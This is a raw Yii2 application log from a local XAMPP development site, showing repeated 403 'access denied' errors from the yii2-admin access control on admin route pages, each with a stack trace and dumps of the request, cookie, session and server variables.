    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58627'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629391.5682
    'REQUEST_TIME' => 1769629391
]
2026-01-28 15:43:12 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:11 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/site/diagnosticar-menu'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '40'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58630'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629391.846
    'REQUEST_TIME' => 1769629391
]
2026-01-28 15:43:13 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:12 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/site/diagnosticar-menu'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '40'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58625'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629392.0867
    'REQUEST_TIME' => 1769629392
]
2026-01-28 15:43:22 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ind...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:21 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_CACHE_CONTROL' => 'max-age=0'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58634'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629401.3919
    'REQUEST_TIME' => 1769629401
]
2026-01-28 15:43:23 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:22 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a66da13733'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
